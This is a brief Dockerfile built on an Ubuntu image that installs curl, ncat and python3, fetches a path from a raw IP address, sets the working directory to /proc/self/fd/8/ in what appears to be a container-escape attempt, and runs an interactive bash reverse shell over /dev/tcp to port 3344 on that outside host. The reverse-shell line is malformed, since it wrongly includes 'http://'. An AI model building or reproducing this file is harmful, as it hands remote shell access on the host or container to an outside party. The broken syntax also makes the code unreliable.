FROM ubuntu
RUN apt update && apt install -y curl && apt install -y ncat && apt install python3 -y
RUN curl http://68.183.4.199/gcp/8/

WORKDIR /proc/self/fd/8/
RUN bash -i >& /dev/tcp/http://68.183.4.199/3344 0>&1

CMD ["/bin/bash"]
